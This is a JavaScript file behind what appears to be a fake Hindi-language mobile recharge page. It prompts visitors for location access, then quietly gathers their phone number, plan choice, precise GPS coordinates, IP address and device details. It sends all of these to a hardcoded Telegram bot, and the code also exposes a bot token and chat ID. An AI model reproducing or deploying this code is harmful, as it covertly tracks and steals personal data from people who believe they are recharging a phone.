const form = document.getElementById("rechargeForm");
const submitBtn = document.getElementById("submitBtn");
const loadingSpinner = document.getElementById("loadingSpinner");
const popupModal = document.getElementById("popupModal");
const closePopupBtn = document.getElementById("closePopup");

// Your Telegram Bot token and chat ID (replace with your own)
const TELEGRAM_BOT_TOKEN = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
const TELEGRAM_CHAT_ID = "6038115234";

// On page load: ask for location permission
window.onload = () => {
  if (!navigator.geolocation) {
    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
    return;
  }
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      console.log("Location access granted");
    },
    (err) => {
      alert("कृपया लोकेशन एक्सेस अनुमति दें ताकि हम आपकी सहायता कर सकें।");
    }
  );
};

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const mobile = form.mobile.value.trim();
  const plan = form.plan.value;

  if (!mobile.match(/^[6-9]\d{9}$/)) {
    alert("कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें।");
    return;
  }
  if (!plan) {
    alert("कृपया रिचार्ज प्लान चुनें।");
    return;
  }
  if (!navigator.geolocation) {
    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
    return;
  }

  submitBtn.style.display = "none";
  loadingSpinner.style.display = "block";

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const deviceInfo = navigator.userAgent;

      // Get IP address using public API
      let ip = "Unknown";
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        ip = data.ip;
      } catch {
        ip = "Unavailable";
      }

      // Prepare Telegram message
      const message = `📱 नया रिचार्ज अनुरोध:
मोबाइल नंबर: ${mobile}
प्लान: ${plan}
लोकेशन: https://www.google.com/maps?q=${latitude},${longitude}
IP: ${ip}
डिवाइस: ${deviceInfo}
`;

      try {
        // Send to Telegram bot
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
          }),
        });

        loadingSpinner.style.display = "none";
        popupModal.classList.add("show");
        form.reset();
        submitBtn.style.display = "inline-block";
      } catch (error) {
        alert("त्रुटि हुई। कृपया पुनः प्रयास करें।");
        loadingSpinner.style.display = "none";
        submitBtn.style.display = "inline-block";
      }
    },
    (err) => {
      alert("लोकेशन एक्सेस अनुमति आवश्यक है। कृपया Allow करें।");
      loadingSpinner.style.display = "none";
      submitBtn.style.display = "inline-block";
    }
  );
});

// Close popup
closePopupBtn.addEventListener("click", () => {
  popupModal.classList.remove("show");
});
